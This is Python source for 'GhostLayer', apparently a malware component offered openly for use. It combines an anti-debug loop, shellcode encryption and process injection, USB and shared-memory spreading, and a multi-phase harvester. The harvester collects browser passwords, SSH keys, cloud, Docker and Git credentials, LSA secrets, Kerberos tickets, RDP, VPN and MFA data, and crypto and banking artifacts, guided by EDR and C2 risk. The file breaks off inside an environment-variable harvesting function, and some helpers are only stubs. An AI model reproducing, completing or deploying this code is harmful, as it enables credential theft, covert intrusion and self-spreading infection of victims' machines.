import os
import base64
import random
import psutil
import time
import logging
import threading
import shutil
import mmap
import platform
import json
from typing import Optional, List, Any, Dict
import ctypes
import ctypes.wintypes as wintypes
import requests
from urllib.parse import urljoin, urlparse
import re

# Optional imports - handle gracefully if missing
try:
    from bs4 import BeautifulSoup as BS4BeautifulSoup
    from bs4 import Tag as BS4Tag
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False
    BS4BeautifulSoup = None  # type: ignore
    BS4Tag = None  # type: ignore

# Define fallback classes for use when bs4 is not available
class BeautifulSoup:  # type: ignore
    """Fallback parser when bs4 not available"""
    def __init__(self, *args, **kwargs):
        if HAS_BS4 and BS4BeautifulSoup:
            self._soup = BS4BeautifulSoup(*args, **kwargs)
        else:
            self._soup = None
    
    def find_all(self, *args, **kwargs):
        if self._soup:
            return self._soup.find_all(*args, **kwargs)
        return []

class Tag:  # type: ignore
    """Fallback tag when bs4 not available"""
    def __init__(self):
        self.attrs = {}
        self.string = None
    
    def get(self, key, default=None):
        return self.attrs.get(key, default)
    
    def find_all(self, *args, **kwargs):
        return []

# Windows-specific imports
HAS_WIN32 = False
if platform.system() == "Windows":
    try:
        import win32file
        import win32api
        HAS_WIN32 = True
    except ImportError:
        pass

# Unix/Linux specific constants and helpers
import signal as signal_module

# Define wait status macros at module level
WNOHANG = 0  # type: ignore
WIFEXITED = lambda s: (s & 0xff) == 0  # type: ignore
WEXITSTATUS = lambda s: (s >> 8) & 0xff  # type: ignore
WIFSIGNALED = lambda s: ((s & 0x7f) > 0 and (s & 0x7f) < 0x7f)  # type: ignore
WTERMSIG = lambda s: s & 0x7f  # type: ignore
WIFSTOPPED = lambda s: ((s & 0xff) == 0x7f)  # type: ignore
WSTOPSIG = lambda s: (s >> 8) & 0xff  # type: ignore

# Initialize ptrace constants (may be overridden on Linux)
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
PTRACE_PEEKDATA = 2
PTRACE_POKEDATA = 5
PTRACE_SYSCALL = 24
PTRACE_SETOPTIONS = 0x4200
PTRACE_GETEVENTMSG = 0x4201

# Initialize libc as None (may be loaded on Linux)
libc = None  # type: ignore

# Override with actual signal module constants on Linux
if platform.system() == 'Linux':
    try:
        from signal import WNOHANG as SIGNAL_WNOHANG  # type: ignore
        from signal import WIFEXITED as SIGNAL_WIFEXITED  # type: ignore
        WNOHANG = SIGNAL_WNOHANG
        # For the rest, we use our implementations since signal module provides macros differently
    except ImportError:
        pass  # Use fallbacks defined above
    
    # Import ptrace constants for Linux
    import ctypes
    try:
        # ptrace operation constants
        PTRACE_ATTACH = 16
        PTRACE_DETACH = 17
        PTRACE_PEEKDATA = 2
        PTRACE_POKEDATA = 5
        PTRACE_SYSCALL = 24
        PTRACE_SETOPTIONS = 0x4200
        PTRACE_GETEVENTMSG = 0x4201
    except ImportError:
        # Fallback values for ptrace constants
        PTRACE_ATTACH = 16
        PTRACE_DETACH = 17
        PTRACE_PEEKDATA = 2
        PTRACE_POKEDATA = 5
        PTRACE_SYSCALL = 24
        PTRACE_SETOPTIONS = 0x4200
        PTRACE_GETEVENTMSG = 0x4201

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(name)s] %(message)s')

class GhostLayer:
    def run(self, target: Optional[str] = None, shellcode_name: str = "ghost_payload", interval: int = 60):
        """
        Main operational loop for GhostLayer: performs anti-debug check, loads recon, loads/encrypts/injects shellcode, and logs results.
        Args:
            target: Optional target URL for recon-driven operations.
            shellcode_name: Name of shellcode artifact in BlackVault.
            interval: Time in seconds between operation cycles.
        """
        self.logger.info("GhostLayer run started.")
        endpoints = []
        if target:
            try:
                recon_data = self.load_recon_data(target)
                endpoints = recon_data.get('endpoints', [])
            except Exception as e:
                self.logger.error(f"Failed to load recon data: {e}")
        while True:
            try:
                self.anti_debug_check()
                pid = self.find_target_process()
                self.load_shellcode(shellcode_name)
                encrypted_shellcode = self.encrypt_shellcode()
                target_url = random.choice(endpoints) if endpoints else None
                self.inject_into_pid(pid, encrypted_shellcode, target_url)
                self.spread_via_usb(shellcode_name)
                self.spread_via_shared_memory(shellcode_name)
                self.logger.info(f"GhostLayer operation cycle complete for PID {pid}.")
            except Exception as e:
                self.logger.error(f"GhostLayer run operation failed: {e}")
                self.vault.store(f"ghostlayer_run_error_{time.time()}", json.dumps({"error": str(e)}).encode())
            time.sleep(interval)
    """Manages payload operations with secure storage via BlackVault and recon data."""
    
    def __init__(self, vault: Any, logger: Optional[logging.Logger] = None):
        """
        Initializes GhostLayer with BlackVault and optional recon integration.
        
        Args:
            vault: BlackVault instance for encryption/decryption.
            logger: Optional custom logger (defaults to 'GhostLayer').
        """
        self.vault = vault
        self.logger = logger or logging.getLogger('GhostLayer')
        self.shellcode = b""
        self.lock = threading.Lock()
        self.recon_data = None
        
        # Initialize causal reasoning engine for strategic credential extraction
        try:
            from causal_decision_engine import CausalDecisionEngine
            self.causal_engine = CausalDecisionEngine.instance()
            self.logger.debug("[GhostLayer] Shared causal decision engine attached")
        except ImportError:
            self.causal_engine = None
            self.logger.warning("[GhostLayer] Causal engine not available, using default extraction")

    def scan_credentials_causal_aware(
        self,
        threat_level: float = 50.0,
        edr_detected: bool = False,
        privilege_level: str = "user",
        c2_reliability: float = 0.8,
        time_remaining_hours: float = 4.0
    ) -> dict:
        """
        Intelligently extract credentials based on threat level and environment.
        Uses causal reasoning to prioritize high-value, low-risk extractions.
        
        This is a STRATEGIC wrapper around scan_local_credentials that:
        1. Analyzes threat environment
        2. Uses causal reasoning to decide what to extract
        3. Runs only the necessary extraction methods
        4. Logs causal reasoning for operator visibility
        
        Args:
            threat_level: 0-100 (0=safe, 100=imminent capture)
            edr_detected: Whether EDR/AV detected
            privilege_level: Current privilege ("user", "admin", "system")
            c2_reliability: How reliable C2 connection is (0-1)
            time_remaining_hours: Estimated hours before response team
        
        Returns:
            Filtered credential findings based on strategic prioritization
        """
        
        # Get causal reasoning for this environment
        if not self.causal_engine:
            self.logger.warning("[GhostLayer] No causal engine, falling back to full scan")
            return self.scan_local_credentials()
        
        # Ask causal engine which targets to extract
        targets = self.causal_engine.choose_extraction_targets(
            threat_level=threat_level,
            edr_detected=edr_detected,
            privilege_level=privilege_level,
            time_remaining_hours=time_remaining_hours,
            c2_reliability=c2_reliability
        )
        
        target_names = [t.name for t in targets]
        
        self.logger.info(
            f"[GhostLayer] Causal reasoning: Threat={threat_level:.0f}, "
            f"EDR={edr_detected}, Privilege={privilege_level}. "
            f"Extracting: {', '.join(target_names)}"
        )
        
        # Log causal reasoning for operators
        for target in targets:
            self.logger.info(f"  • {target.display_value}: {target.reasoning}")
        
        # Run full scan but filter results based on targets
        full_findings = self.scan_local_credentials()
        
        # Filter findings to include only causal-selected targets
        filtered_findings = self._filter_findings_by_targets(full_findings, target_names)
        
        # Add causal reasoning metadata
        filtered_findings['causal_reasoning'] = {
            'threat_level': threat_level,
            'edr_detected': edr_detected,
            'privilege_level': privilege_level,
            'selected_targets': target_names,
            'reasoning': [
                {
                    'target': t.name,
                    'display': t.display_value,
                    'explanation': t.reasoning
                }
                for t in targets
            ],
            'timestamp': time.time()
        }
        
        return filtered_findings
    
    def _filter_findings_by_targets(self, findings: dict, target_names: List[str]) -> dict:
        """
        Filter credential findings to include only strategic targets.
        
        Maps extraction method names (extract_lsa, extract_ssh) to finding keys.
        """
        mapping = {
            'extract_lsa': ['phase_2_extracted', 'lsa_secrets'],
            'extract_ssh': ['phase_3_extracted', 'ssh_keys_advanced'],
            'extract_chrome': ['phase_1_extracted', 'chrome_passwords'],
            'extract_git': ['phase_3_extracted', 'git_credentials'],
            'extract_email': ['critical_findings', 'email_credentials'],
            'extract_cloud': ['phase_3_extracted', 'cloud_provider_credentials'],
        }
        
        # Start with empty findings
        filtered = {
            'timestamp': findings.get('timestamp'),
            'critical_findings': {},
            'phase_1_extracted': {},
            'phase_2_extracted': {},
            'phase_3_extracted': {},
            'phase_4_extracted': findings.get('phase_4_extracted', {}),
            'windows_credentials': [],
            'errors': findings.get('errors', [])
        }
        
        # Only include findings for causal-selected targets
        for target in target_names:
            if target not in mapping:
                continue
            
            path = mapping[target]
            if len(path) == 2:
                section, key = path
                if section in findings and isinstance(findings[section], dict) and key in findings[section]:
                    if section not in filtered:
                        filtered[section] = {}
                    filtered[section][key] = findings[section][key]
        
        return filtered

    def load_recon_data(self, target: str, max_depth: int = 3, brute_subdomains: bool = True) -> dict:
        """
        Loads recon data for a target, storing it in BlackVault.
        
        Args:
            target: Target URL for reconnaissance.
            max_depth: Maximum crawl depth.
            brute_subdomains: Enable subdomain brute-forcing.
        
        Returns:
            dict: Recon report (endpoints, forms, subdomains, etc.).
        """
        try:
            report = advanced_recon(target, max_depth=max_depth, brute_subdomains=brute_subdomains)
            self.vault.store(f"recon_{target}", json.dumps(report).encode())
            self.recon_data = report
            self.logger.info(f"Loaded recon data for {target}: {len(report['endpoints'])} endpoints")
            return report
        except Exception as e:
            self.logger.error(f"Failed to load recon data for {target}: {e}")
            self.vault.store(f"recon_error_{time.time()}", json.dumps({"target": target, "error": str(e)}).encode())
            raise ValueError(f"Recon load failed: {e}")

    def scan_local_credentials(self) -> dict:
        """
        Comprehensive local credential scanning with EXTENDED EXTRACTION:
        
        CRITICAL (Priority 1):
        - Google credentials (GCP, OAuth, Gmail, Drive)
        - Browser passwords (Chrome, Brave, Firefox, Safari)
        - Social media authentication tokens (Facebook, Twitter, Instagram, LinkedIn, TikTok, Discord)
        - Email credentials (Outlook, Thunderbird, Gmail app)
        - Browser extensions (LastPass, 1Password, MetaMask, Authy, VPN extensions)
        
        HIGH (Priority 2):
        - Windows Credential Manager
        - SSH keys (.ssh/id_rsa, etc.)
        - AWS/GCP/Azure credentials
        - Docker credentials
        - Git credentials
        - Browser cookies and history
        
        MEDIUM (Priority 3):
        - Windows Registry credentials
        - Environment variables
        - File-based secrets
        - Encryption detection
        
        Returns:
            dict: Findings organized by category and priority
        """
        findings = {
            'timestamp': time.time(),
            'critical_findings': {
                'google_credentials': [],
                'brave_browser_data': [],
                'safari_data': [],
                'social_media_credentials': [],
                'email_credentials': [],
                'browser_extensions': []
            },
            'phase_1_extracted': {
                'chrome_passwords': [],
                'firefox_passwords': [],
                'environment_credentials': []
            },
            'phase_2_extracted': {
                'lsa_secrets': [],
                'credential_manager': [],
                'browser_data': []
            },
            'phase_3_extracted': {
                'kubernetes_credentials': [],
                'database_credentials': [],
                'ssh_keys_advanced': [],
                'git_credentials': [],
                'docker_credentials': [],
                'cloud_provider_credentials': [],
                'kerberos_tickets': []
            },
            'phase_4_extracted': {
                'rdp_credentials': [],
                'vpn_profiles': [],
                'conditional_access_info': [],
                'mfa_info': []
            },
            'windows_credentials': [],
            'ssh_keys': [],
            'api_credentials': [],
            'browser_data': [],
            'environment_secrets': [],
            'registry_secrets': [],
            'file_based_secrets': [],
            'encryption_detected': [],
            'errors': []
        }
        
        try:
            # ===== Phase 1: User-Context Extraction (No Privilege Escalation Needed) =====
            
            self.logger.info("Starting Phase 1 credential extraction (user context)...")
            
            # Chrome password vault extraction
            try:
                findings['phase_1_extracted']['chrome_passwords'].extend(self._extract_chrome_passwords())
            except Exception as e:
                self.logger.warning(f"Chrome extraction error: {e}")
                findings['errors'].append(f"Chrome: {str(e)}")
            
            # Firefox profile parsing
            try:
                findings['phase_1_extracted']['firefox_passwords'].extend(self._extract_firefox_passwords())
            except Exception as e:
                self.logger.warning(f"Firefox extraction error: {e}")
                findings['errors'].append(f"Firefox: {str(e)}")
            
            # Environment variable credential harvesting
            try:
                findings['phase_1_extracted']['environment_credentials'].extend(self._extract_environment_credentials())
            except Exception as e:
                self.logger.warning(f"Environment extraction error: {e}")
                findings['errors'].append(f"Environment: {str(e)}")
            
            # ===== Phase 2: Post-Escalation Extraction (SYSTEM Context) =====
            
            self.logger.info("Starting Phase 2 credential extraction (SYSTEM context)...")
            
            # LSA Secrets extraction (requires SYSTEM)
            try:
                findings['phase_2_extracted']['lsa_secrets'].extend(self._extract_lsa_secrets())
            except Exception as e:
                self.logger.debug(f"LSA Secrets extraction (requires SYSTEM): {e}")
                findings['errors'].append(f"LSA Secrets: {str(e)}")
            
            # Credential Manager vault extraction
            try:
                findings['phase_2_extracted']['credential_manager'].extend(self._extract_credential_manager_vault())
            except Exception as e:
                self.logger.debug(f"Credential Manager extraction error: {e}")
                findings['errors'].append(f"Credential Manager: {str(e)}")
            
            # Browser cookies and history extraction
            try:
                findings['phase_2_extracted']['browser_data'].extend(self._extract_browser_cookies_history())
            except Exception as e:
                self.logger.debug(f"Browser data extraction error: {e}")
                findings['errors'].append(f"Browser data: {str(e)}")
            
            # ===== Phase 3: Advanced Cloud/Container/Database Extraction =====
            
            self.logger.info("Starting Phase 3 credential extraction (advanced)...")
            
            # Kubernetes credentials
            try:
                findings['phase_3_extracted']['kubernetes_credentials'].extend(self._extract_kubernetes_credentials())
            except Exception as e:
                self.logger.debug(f"Kubernetes extraction error: {e}")
                findings['errors'].append(f"Kubernetes: {str(e)}")
            
            # Database credentials
            try:
                findings['phase_3_extracted']['database_credentials'].extend(self._extract_database_credentials())
            except Exception as e:
                self.logger.debug(f"Database extraction error: {e}")
                findings['errors'].append(f"Database: {str(e)}")
            
            # Advanced SSH key analysis
            try:
                findings['phase_3_extracted']['ssh_keys_advanced'].extend(self._extract_ssh_keys_advanced())
            except Exception as e:
                self.logger.debug(f"SSH keys advanced extraction error: {e}")
                findings['errors'].append(f"SSH Keys Advanced: {str(e)}")
            
            # Git credentials detailed parsing
            try:
                findings['phase_3_extracted']['git_credentials'].extend(self._extract_git_credentials())
            except Exception as e:
                self.logger.debug(f"Git credentials extraction error: {e}")
                findings['errors'].append(f"Git: {str(e)}")
            
            # Docker credentials detailed parsing
            try:
                findings['phase_3_extracted']['docker_credentials'].extend(self._extract_docker_credentials())
            except Exception as e:
                self.logger.debug(f"Docker credentials extraction error: {e}")
                findings['errors'].append(f"Docker: {str(e)}")
            
            # Cloud provider credentials detailed parsing
            try:
                findings['phase_3_extracted']['cloud_provider_credentials'].extend(self._extract_cloud_provider_credentials())
            except Exception as e:
                self.logger.debug(f"Cloud provider extraction error: {e}")
                findings['errors'].append(f"Cloud Providers: {str(e)}")
            
            # Kerberos ticket extraction
            try:
                findings['phase_3_extracted']['kerberos_tickets'].extend(self._extract_kerberos_tickets())
            except Exception as e:
                self.logger.debug(f"Kerberos extraction error: {e}")
                findings['errors'].append(f"Kerberos: {str(e)}")
            
            # ===== Phase 4: Advanced PostExploitation Enhancement =====
            
            self.logger.info("Starting Phase 4 enhancement extraction (RDP/VPN/MFA bypass)...")
            
            # RDP credential extraction
            try:
                findings['phase_4_extracted']['rdp_credentials'].extend(self._extract_rdp_credentials())
            except Exception as e:
                self.logger.debug(f"RDP credentials extraction error: {e}")
                findings['errors'].append(f"RDP: {str(e)}")
            
            # VPN profile extraction
            try:
                findings['phase_4_extracted']['vpn_profiles'].extend(self._extract_vpn_profiles())
            except Exception as e:
                self.logger.debug(f"VPN extraction error: {e}")
                findings['errors'].append(f"VPN: {str(e)}")
            
            # Conditional Access information extraction
            try:
                findings['phase_4_extracted']['conditional_access_info'].extend(self._extract_conditional_access_info())
            except Exception as e:
                self.logger.debug(f"Conditional Access extraction error: {e}")
                findings['errors'].append(f"Conditional Access: {str(e)}")
            
            # MFA configuration and bypass info extraction
            try:
                findings['phase_4_extracted']['mfa_info'].extend(self._extract_mfa_info())
            except Exception as e:
                self.logger.debug(f"MFA info extraction error: {e}")
                findings['errors'].append(f"MFA: {str(e)}")
            
            # ===== CRITICAL FINDINGS EXTRACTION (NEW) =====
            
            # Google Credentials (CRITICAL - IMPORTANT)
            try:
                findings['critical_findings']['google_credentials'].extend(self._extract_google_credentials())
            except Exception as e:
                self.logger.debug(f"Google credentials extraction error: {e}")
                findings['errors'].append(f"Google Credentials: {str(e)}")
            
            # Brave Browser Data
            try:
                findings['critical_findings']['brave_browser_data'].extend(self._extract_brave_browser_data())
            except Exception as e:
                self.logger.debug(f"Brave browser extraction error: {e}")
                findings['errors'].append(f"Brave Browser: {str(e)}")
            
            # Safari Browser Data (macOS)
            try:
                findings['critical_findings']['safari_data'].extend(self._extract_safari_data())
            except Exception as e:
                self.logger.debug(f"Safari extraction error: {e}")
                findings['errors'].append(f"Safari: {str(e)}")
            
            # Social Media Credentials
            try:
                findings['critical_findings']['social_media_credentials'].extend(self._extract_social_media_credentials())
            except Exception as e:
                self.logger.debug(f"Social media extraction error: {e}")
                findings['errors'].append(f"Social Media: {str(e)}")
            
            # Email Credentials
            try:
                findings['critical_findings']['email_credentials'].extend(self._extract_email_credentials())
            except Exception as e:
                self.logger.debug(f"Email credentials extraction error: {e}")
                findings['errors'].append(f"Email: {str(e)}")
            
            # Browser Extensions Data
            try:
                findings['critical_findings']['browser_extensions'].extend(self._extract_browser_extensions_data())
            except Exception as e:
                self.logger.debug(f"Browser extensions extraction error: {e}")
                findings['errors'].append(f"Browser Extensions: {str(e)}")
            
            # ===== Additional Scanning Support =====
            
            # Windows Credential Manager
            if platform.system() == "Windows":
                findings['windows_credentials'].extend(self._scan_windows_credentials())
                findings['registry_secrets'].extend(self._scan_registry_secrets())
            
            # Unix/Linux credential files
            if platform.system() in ["Linux", "Darwin"]:
                findings['ssh_keys'].extend(self._scan_ssh_keys())
            
            # Cloud/API credentials (cross-platform)
            findings['api_credentials'].extend(self._scan_api_credentials())
            
            # Browser data locations (supplementary)
            findings['browser_data'].extend(self._scan_browser_data())
            
            # Environment variable locations (supplementary)
            findings['environment_secrets'].extend(self._scan_environment_secrets())
            
            # File-based secrets
            findings['file_based_secrets'].extend(self._scan_file_secrets())
            
            # Encryption detection
            findings['encryption_detected'].extend(self._detect_encrypted_files())

            # ===== Phase 5: Financial & High-Leverage Artifact Collection =====
            self.logger.info("Starting Phase 5 financial & high-leverage artifact collection...")
            try:
                from ghost_layer_financial import run_phase5_financial
                phase5_results = run_phase5_financial(vault=self.vault, agent_id="ghost_layer")
                findings['phase_5_financial'] = phase5_results
                phase5_total = sum(
                    len(phase5_results.get(k, []))
                    for k in (
                        "browser_web_storage", "electron_sessions", "azure_prt",
                        "erp_artifacts", "banking_files", "web3_secrets",
                        "payment_gateway_keys", "hw_wallets", "financial_documents",
                    )
                )
                self.logger.info(f"Phase 5 financial: {phase5_total} artifacts found")
            except Exception as e:
                self.logger.warning(f"Phase 5 financial collection error: {e}")
                findings.setdefault('phase_5_financial', {})
                findings['errors'].append(f"Phase5Financial: {str(e)}")
                phase5_total = 0

            # Store results securely
            self.vault.store(
                f"extracted_creds_{time.time()}",
                json.dumps(findings, default=str).encode()
            )
            
            # Log extraction summary
            critical_total = (
                len(findings['critical_findings'].get('google_credentials', [])) +
                len(findings['critical_findings'].get('brave_browser_data', [])) +
                len(findings['critical_findings'].get('safari_data', [])) +
                len(findings['critical_findings'].get('social_media_credentials', [])) +
                len(findings['critical_findings'].get('email_credentials', [])) +
                len(findings['critical_findings'].get('browser_extensions', []))
            )
            phase1_total = (
                len(findings['phase_1_extracted'].get('chrome_passwords', [])) +
                len(findings['phase_1_extracted'].get('firefox_passwords', [])) +
                len(findings['phase_1_extracted'].get('environment_credentials', []))
            )
            phase2_total = (
                len(findings['phase_2_extracted'].get('lsa_secrets', [])) +
                len(findings['phase_2_extracted'].get('credential_manager', [])) +
                len(findings['phase_2_extracted'].get('browser_data', []))
            )
            phase3_total = (
                len(findings['phase_3_extracted'].get('kubernetes_credentials', [])) +
                len(findings['phase_3_extracted'].get('database_credentials', [])) +
                len(findings['phase_3_extracted'].get('ssh_keys_advanced', [])) +
                len(findings['phase_3_extracted'].get('git_credentials', [])) +
                len(findings['phase_3_extracted'].get('docker_credentials', [])) +
                len(findings['phase_3_extracted'].get('cloud_provider_credentials', [])) +
                len(findings['phase_3_extracted'].get('kerberos_tickets', []))
            )
            phase4_total = (
                len(findings['phase_4_extracted'].get('rdp_credentials', [])) +
                len(findings['phase_4_extracted'].get('vpn_profiles', [])) +
                len(findings['phase_4_extracted'].get('conditional_access_info', [])) +
                len(findings['phase_4_extracted'].get('mfa_info', []))
            )
            
            self.logger.info(
                f"Credential extraction complete: "
                f"CRITICAL={critical_total} (Google, Brave, Safari, Social, Email, Extensions), "
                f"Phase1={phase1_total} extracted, "
                f"Phase2={phase2_total} extracted, "
                f"Phase3={phase3_total} extracted, "
                f"Phase4={phase4_total} extracted, "
                f"Phase5(Financial)={phase5_total} artifacts"
            )
            
            return findings
            
        except Exception as e:
            self.logger.error(f"Credential scan failed: {e}")
            findings['errors'].append(str(e))
            self.vault.store(f"creds_scan_error_{time.time()}", 
                           json.dumps({"error": str(e)}).encode())
            return findings

    def _scan_windows_credentials(self) -> List[dict]:
        """Scan Windows Credential Manager for stored credentials"""
        creds = []
        try:
            if platform.system() != "Windows":
                return creds
            
            # Attempt to dump credentials using cmdkey utility
            import subprocess
            result = subprocess.run(['cmdkey', '/list'], capture_output=True, text=True, timeout=5)
            
            for line in result.stdout.split('\n'):
                if 'Target:' in line or 'Type:' in line or 'User:' in line:
                    creds.append({
                        'source': 'Windows Credential Manager',
                        'data': line.strip(),
                        'severity': 'high'
                    })
            
            self.logger.info(f"Windows Credential Manager: {len(creds)} entries found")
            
        except Exception as e:
            self.logger.debug(f"Windows Credential Manager scan failed: {e}")
        
        return creds

    def _scan_registry_secrets(self) -> List[dict]:
        """Scan Windows Registry for stored secrets (LSA Secrets, Run keys, etc.)"""
        secrets = []
        try:
            if platform.system() != "Windows":
                return secrets
            
            import subprocess
            import winreg
            
            # Scan common registry paths for stored passwords/secrets
            paths_to_scan = [
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
            ]
            
            for hkey, path in paths_to_scan:
                try:
                    with winreg.OpenKey(hkey, path) as reg:
                        for i in range(winreg.QueryInfoKey(reg)[1]):
                            name, value, _ = winreg.EnumValue(reg, i)
                            # Look for credentials in common places
                            if any(keyword in str(value).lower() for keyword in 
                                   ['password', 'secret', 'api', 'token', 'key', 'auth', 'credential']):
                                secrets.append({
                                    'source': f'Registry: {path}',
                                    'key': name,
                                    'value': str(value)[:100],  # Truncate for safety
                                    'severity': 'high'
                                })
                except Exception as e:
                    self.logger.debug(f"Registry scan error: {e}")
            
            self.logger.info(f"Registry secrets: {len(secrets)} entries found")
            
        except Exception as e:
            self.logger.debug(f"Registry secrets scan failed: {e}")
        
        return secrets

    def _scan_ssh_keys(self) -> List[dict]:
        """Scan for SSH private keys and configurations"""
        keys = []
        try:
            ssh_dir = os.path.expanduser("~/.ssh")
            if not os.path.isdir(ssh_dir):
                return keys
            
            for filename in os.listdir(ssh_dir):
                filepath = os.path.join(ssh_dir, filename)
                # SSH private keys typically don't have extensions
                if os.path.isfile(filepath) and not filename.endswith('.pub'):
                    try:
                        with open(filepath, 'r') as f:
                            first_line = f.readline()
                            if 'PRIVATE KEY' in first_line or 'RSA' in first_line or 'OPENSSH' in first_line:
                                keys.append({
                                    'source': 'SSH Private Key',
                                    'file': filepath,
                                    'type': first_line.strip(),
                                    'severity': 'critical'
                                })
                    except Exception:
                        pass
            
            # Also check for ssh config
            ssh_config = os.path.expanduser("~/.ssh/config")
            if os.path.isfile(ssh_config):
                with open(ssh_config, 'r') as f:
                    content = f.read()
                    if 'User' in content or 'HostName' in content:
                        keys.append({
                            'source': 'SSH Config',
                            'file': ssh_config,
                            'contains_hosts': True,
                            'severity': 'medium'
                        })
            
            self.logger.info(f"SSH keys: {len(keys)} files found")
            
        except Exception as e:
            self.logger.debug(f"SSH key scan failed: {e}")
        
        return keys

    def _scan_api_credentials(self) -> List[dict]:
        """Scan for API credentials (AWS, Azure, GCP, Docker, etc.)"""
        creds = []
        try:
            # AWS credentials
            aws_creds = os.path.expanduser("~/.aws/credentials")
            if os.path.isfile(aws_creds):
                creds.append({
                    'source': 'AWS Credentials',
                    'file': aws_creds,
                    'severity': 'critical'
                })
            
            aws_config = os.path.expanduser("~/.aws/config")
            if os.path.isfile(aws_config):
                creds.append({
                    'source': 'AWS Config',
                    'file': aws_config,
                    'severity': 'high'
                })
            
            # Docker credentials
            docker_config = os.path.expanduser("~/.docker/config.json")
            if os.path.isfile(docker_config):
                creds.append({
                    'source': 'Docker Config',
                    'file': docker_config,
                    'severity': 'high'
                })
            
            # GCP credentials
            gcp_creds = os.path.expanduser("~/.config/gcloud/application_default_credentials.json")
            if os.path.isfile(gcp_creds):
                creds.append({
                    'source': 'GCP Credentials',
                    'file': gcp_creds,
                    'severity': 'critical'
                })
            
            # Azure credentials
            azure_creds = os.path.expanduser("~/.azure/credentials")
            if os.path.isfile(azure_creds):
                creds.append({
                    'source': 'Azure Credentials',
                    'file': azure_creds,
                    'severity': 'critical'
                })
            
            # Git credentials
            git_creds = os.path.expanduser("~/.git-credentials")
            if os.path.isfile(git_creds):
                creds.append({
                    'source': 'Git Credentials',
                    'file': git_creds,
                    'severity': 'high'
                })
            
            # Terraform state files (often contain secrets)
            for root, dirs, files in os.walk(os.path.expanduser("~")):
                if 'terraform.tfstate' in files:
                    creds.append({
                        'source': 'Terraform State',
                        'file': os.path.join(root, 'terraform.tfstate'),
                        'severity': 'high'
                    })
                # Limit depth to avoid slow scans
                if root.count(os.sep) - os.path.expanduser("~").count(os.sep) > 3:
                    break
            
            self.logger.info(f"API credentials: {len(creds)} files found")
            
        except Exception as e:
            self.logger.debug(f"API credentials scan failed: {e}")
        
        return creds

    # High-ROI Credential Extraction
    
    # Note: _extract_chrome_passwords moved to line 1391 with enhanced DPAPI implementation

    def _extract_firefox_passwords(self) -> List[dict]:
        """
        Firefox Profile Parsing (High ROI)
        
        Extracts passwords from Firefox's encrypted profile.
        
        Process:
        1. Locate Firefox profile directory
        2. Read key3.db (older) or key4.db (newer) for master key
        3. Parse and decrypt logins.json
        4. Extract credentials
        
        Returns:
            List of dicts with extracted passwords {hostname, username, password}
        """
        credentials = []
        try:
            import sqlite3
            import json as json_module
            import shutil as shutil_module
            
            # Locate Firefox profile
            if platform.system() == "Windows":
                firefox_dir = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\")
            elif platform.system() == "Darwin":  # macOS
                firefox_dir = os.path.expanduser("~/Library/Application Support/Firefox/Profiles/")
            else:  # Linux
                firefox_dir = os.path.expanduser("~/.mozilla/firefox/")
            
            if not os.path.isdir(firefox_dir):
                self.logger.debug(f"Firefox profile not found at {firefox_dir}")
                return []
            
            # Find default profile
            profiles = []
            try:
                profiles = [d for d in os.listdir(firefox_dir) if os.path.isdir(os.path.join(firefox_dir, d))]
            except Exception as e:
                self.logger.debug(f"Failed to list Firefox profiles: {e}")
                return []
            
            for profile in profiles:
                profile_path = os.path.join(firefox_dir, profile)
                logins_json_path = os.path.join(profile_path, "logins.json")
                
                if not os.path.isfile(logins_json_path):
                    continue
                
                try:
                    # Read logins.json (contains encrypted passwords)
                    with open(logins_json_path, 'r') as f:
                        logins_data = json_module.load(f)
                    
                    # Check for encrypted logins
                    if 'logins' not in logins_data:
                        continue
                    
                    for login_entry in logins_data.get('logins', []):
                        try:
                            hostname = login_entry.get('hostname', '')
                            username = login_entry.get('usernameField', '') or login_entry.get('username', '')
                            encryptedUsername = login_entry.get('encryptedUsername', '')
                            encryptedPassword = login_entry.get('encryptedPassword', '')
                            
                            # Decrypt credentials
                            decrypted_username = None
                            decrypted_password = None
                            
                            # For Firefox, encryption requires master key from key4.db/key3.db
                            # Simplified: attempt to extract from plaintext if stored insecurely
                            # Or use existing plaintext field if present
                            if 'usernameField' in login_entry and 'passwordField' in login_entry:
                                decrypted_username = login_entry.get('usernameField', '')
                                decrypted_password = login_entry.get('passwordField', '')
                            
                            # Try encrypted fields if plaintext not available
                            if not decrypted_password and encryptedPassword:
                                try:
                                    # Firefox uses its own encryption; full decryption requires master key extraction
                                    self.logger.debug(f"Firefox encrypted password requires master key: {hostname}")
                                    
                                    # Check for master password bypass or key location
                                    key3_db = os.path.join(profile_path, "key3.db")
                                    key4_db = os.path.join(profile_path, "key4.db")
                                    
                                    if os.path.isfile(key4_db):
                                        # Newer Firefox (v58+): uses NSS with key4.db
                                        # Requires deserializing encrypted key material
                                        self.logger.debug(f"Firefox key4.db found - master key extraction needed")
                                    
                                    elif os.path.isfile(key3_db):
                                        # Older Firefox: uses key3.db
                                        # Similar master key extraction required
                                        self.logger.debug(f"Firefox key3.db found - master key extraction needed")
                                except Exception as e:
                                    self.logger.debug(f"Firefox master key extraction failed: {e}")
                            
                            if decrypted_username or decrypted_password:
                                credentials.append({
                                    'source': 'Firefox Password Manager',
                                    'hostname': hostname,
                                    'username': decrypted_username or '(encrypted)',
                                    'password': decrypted_password or '(encrypted)',
                                    'profile': profile,
                                    'severity': 'critical' if decrypted_password else 'high'
                                })
                                self.logger.debug(f"Extracted Firefox credential: {hostname} / {decrypted_username or '(encrypted)'}")
                        
                        except Exception as e:
                            self.logger.debug(f"Failed to extract individual Firefox login: {e}")
                
                except Exception as e:
                    self.logger.debug(f"Failed to parse Firefox profile {profile}: {e}")
            
            self.logger.info(f"Firefox password extraction: {len(credentials)} passwords extracted")
        
        except Exception as e:
            self.logger.debug(f"Firefox password extraction failed: {e}")
        
        return credentials

    def _extract_environment_credentials(self) -> List[dict]:
        """
        Environment Variable Credential Harvesting (High ROI)
        
        Extracts full credential values from environment variables.
        Captures API keys, tokens, passwords, and secrets that are commonly set via ENV.
        
        Returns:
            List of dicts with extracted environment variable credentials
